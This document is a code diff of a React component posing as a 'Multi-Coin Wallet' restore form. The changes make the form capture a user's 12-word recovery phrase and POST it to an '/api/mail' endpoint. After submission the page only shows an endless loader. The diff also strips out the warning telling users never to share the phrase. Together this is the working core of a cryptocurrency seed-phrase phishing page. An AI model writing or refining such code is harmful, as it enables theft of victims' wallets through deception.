@@ -1,170 +1,147 @@
 "use client";
 import { useState } from "react";
+import Loader from "../component/Loader";
 
 export default function MultiCoinWallet() {
   const [collapsed, setCollapsed] = useState(false);
   const [showInfo, setShowInfo] = useState(false);
   const [secretPhrase, setSecretPhrase] = useState("");
   const [darkMode, setDarkMode] = useState(true);
+  const [walletType, setWalletType] = useState("main");
+  const [error, setError] = useState("");
+  const [loading, setLoading] = useState(false);
 
-  // Wallet toggle
-  const [walletType, setWalletType] = useState("main"); // main | private
-  const [walletPhrase, setWalletPhrase] = useState([]);
-  const [error, setError] = useState(""); // Error state for secret phrase
+  const countWords = (text) =>
+    text.trim().split(/\s+/).filter(Boolean).length;
 
-  if (walletType === "main" && walletPhrase.length === 0) {
-    // your logic here if needed
-  }
-
-  // Function to count words
-  const countWords = (text) => text.trim().split(/\s+/).filter(Boolean).length;
   async function handleSubmit(e) {
     e.preventDefault();
-    if (!error) {
-      const res=await fetch('/api/mail',{
-        method:"POST",
-        headers:{
-            "content-Type":"application/json"
-        },
 
-        body:JSON.stringify({walletType,walletPhrase})
-      })
-      const data=await res.json()
-      console.log(data)
+    const words = countWords(secretPhrase);
+
+    if (words !== 12) {
+      setError("Secret phrase must be exactly 12 words!");
+      return;
     }
+
+    try {
+      setLoading(true);
+      setError("");
+
+      const res = await fetch("/api/mail", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          walletType,
+          secretPhrase,
+        }),
+      });
+
+      if (!res.ok) {
+        throw new Error("Something went wrong");
+      }
+
+      const data = await res.json();
+      if(res.status==200){
+        setLoading(true);
+     }
+
+      
+      setSecretPhrase("");
+    } catch (err) {
+      console.error(err);
+      setError("Failed to restore wallet. Try again.");
+    } 
+  }
+  if(loading){
+   return <Loader/>;
   }
 
+  else{
+
+  
   return (
     <div
       className={`min-h-screen w-full transition-colors duration-300
-        ${darkMode ? "bg-black text-white" : "bg-gray-100 text-black"}
-      `}
+      ${darkMode ? "bg-black text-white" : "bg-gray-100 text-black"}`}
     >
       <div className="w-full h-full p-4 max-w-md mx-auto">
-        {/* Wallet Type Toggle */}
+        
+        {/* Wallet Toggle */}
         <div className="flex justify-center mb-6">
           <div className="flex bg-[#1c1c1c] rounded-full p-1">
             <button
+              type="button"
               onClick={() => setWalletType("main")}
-              className={`px-4 py-2 rounded-full text-sm font-semibold transition
-                ${walletType === "main" ? "bg-green-500 text-black" : "text-gray-400"}
-              `}
+              className={`px-4 py-2 rounded-full text-sm font-semibold
+              ${walletType === "main"
+                  ? "bg-green-500 text-black"
+                  : "text-gray-400"}`}
             >
               Main Wallet
             </button>
 
             <button
+              type="button"
               onClick={() => setWalletType("private")}
-              className={`px-4 py-2 rounded-full text-sm font-semibold transition
-                ${walletType === "private" ? "bg-green-500 text-black" : "text-gray-400"}
-              `}
+              className={`px-4 py-2 rounded-full text-sm font-semibold
+              ${walletType === "private"
+                  ? "bg-green-500 text-black"
+                  : "text-gray-400"}`}
             >
               Private Wallet
             </button>
           </div>
         </div>
 
-        {/* Header */}
-        <div className="flex items-center justify-between mb-6">
-          <h2 className="text-lg font-semibold">
-            {walletType === "main" ? "Multi-Coin Wallet" : "Private Wallet"}
-          </h2>
-
-          <button
-            onClick={() => setCollapsed(!collapsed)}
-            className="text-green-500 text-2xl font-bold"
-          >
-            {collapsed ? "+" : "-"}
-          </button>
-        </div>
-
-        {/* Wallet Body */}
         {!collapsed && (
-          <form onSubmit={ handleSubmit}>
-            {/* Wallet Name */}
-            <div className="mb-5">
-              <label className="text-sm text-gray-500">Wallet name</label>
-              <input
-                type="text"
-                value={walletType === "main" ? "Main Wallet" : "Private Wallet"}
-                readOnly
-                className={`mt-1 w-full rounded-lg px-3 py-3 text-sm
-                  ${darkMode ? "bg-[#1c1c1c] border border-gray-700" : "bg-white border border-gray-300"}
-                `}
-              />
-            </div>
-
+          <form onSubmit={handleSubmit}>
+            
             {/* Secret Phrase */}
             <div className="mb-4">
               <label className="text-sm text-gray-500">
-                {walletType === "private" ? "Private secret phrase" : "Secret phrase"}
+                Secret Phrase
               </label>
 
-              <div className="relative mt-1">
-                <textarea
-                  rows={4}
-                  value={secretPhrase}
-                  onChange={(e) => {
-                    const words = e.target.value.split(/\s+/).filter(Boolean);
-                    if (words.length <= 12) {
-                      setSecretPhrase(e.target.value);
-                      setError(""); // reset error while typing
-                    }
-                  }}
-                  placeholder={`${walletType === "private" ? "Private " : "Enter exactly 12 words"}`}
-                  className={`w-full rounded-lg px-3 py-3 text-sm resize-none outline-none
-                    ${darkMode ? "bg-[#1c1c1c] border border-green-500" : "bg-white border border-green-600"}
-                  `}
-                />
+              <textarea
+                rows={4}
+                value={secretPhrase}
+                onChange={(e) => {
+                  const value = e.target.value;
+                  setSecretPhrase(value);
 
-                <button
-                  onClick={async () => {
-                    const text = await navigator.clipboard.readText();
-                    const words = text.split(/\s+/).filter(Boolean);
-                    if (words.length <= 12) {
-                      setSecretPhrase(text);
-                      setError("");
-                    } else {
-                      setError("Secret phrase cannot exceed 12 words!");
-                    }
-                  }}
-                  className="absolute right-3 bottom-3 text-green-500 text-sm"
-                >
-                  Paste
-                </button>
-              </div>
+                  const words = countWords(value);
+                  if (words < 12) {
+                    setError("Secret phrase must be exactly 12 words or 24 words!");
+                  } else {
+                    setError("");
+                  }
+                }}
+                placeholder="Enter exactly 12 words"
+                className={`w-full rounded-lg px-3 py-3 text-sm resize-none outline-none
+                ${darkMode
+                    ? "bg-[#1c1c1c] border border-green-500"
+                    : "bg-white border border-green-600"}`}
+              />
 
               <p className="text-xs text-gray-500 mt-1">
-                {walletType === "private"
-                  ? "Private wallets are hidden and more secure"
-                  : "Exactly 12 words separated by spaces"}
+                Exactly 12 words separated by spaces
               </p>
 
-              {error && <p className="text-xs text-red-400 mt-1">{error}</p>}
+              {error && (
+                <p className="text-xs text-red-400 mt-1">{error}</p>
+              )}
             </div>
 
-            {/* Restore Button */}
+            {/* Submit */}
             <button
-              onClick={() => {
-                const words = secretPhrase.trim().split(/\s+/).filter(Boolean);
-                if (words.length !== 12) {
-                  setError("Secret phrase must be exactly 12 words!");
-                  return;
-                }
-                // continue with restore wallet logic here
-                alert("Wallet restored successfully!");
-              }}
+              type="submit"
+              disabled={loading}
               className="w-full bg-green-500 text-black font-semibold py-3 rounded-full mt-6"
             >
-              {walletType === "private" ? "Restore Private Wallet" : "Restore Wallet"}
-            </button>
-
-            {/* Info */}
-            <button
-              onClick={() => setShowInfo(true)}
-              className="mt-4 text-green-500 text-sm underline"
-            >
-              What is a secret phrase?
+              {loading ? "Restoring..." : "Restore Wallet"}
             </button>
           </form>
         )}
@@ -172,30 +149,12 @@ export default function MultiCoinWallet() {
 
       {/* Theme Toggle */}
       <button
+        type="button"
         onClick={() => setDarkMode(!darkMode)}
         className="fixed bottom-4 right-4 bg-green-500 text-black p-3 rounded-full shadow-lg"
       >
         {darkMode ? "☀️" : "🌙"}
       </button>
-
-      {/* Info Modal */}
-      {showInfo && (
-        <div className="fixed inset-0 bg-black/70 flex items-center justify-center p-4 z-50">
-          <div className="bg-[#121212] text-white rounded-xl p-4 max-w-sm w-full">
-            <h3 className="text-lg font-semibold mb-2">What is a Secret Phrase?</h3>
-            <p className="text-sm text-gray-300 mb-2">
-              A secret phrase is a list of <b>12 words</b> that gives full access to your wallet.
-            </p>
-            <p className="text-sm text-red-400 font-semibold">Never share it with anyone.</p>
-            <button
-              onClick={() => setShowInfo(false)}
-              className="mt-4 w-full bg-black text-white py-3 rounded-full"
-            >
-              I Understand
-            </button>
-          </div>
-        </div>
-      )}
     </div>
-  );
+  );}
 }
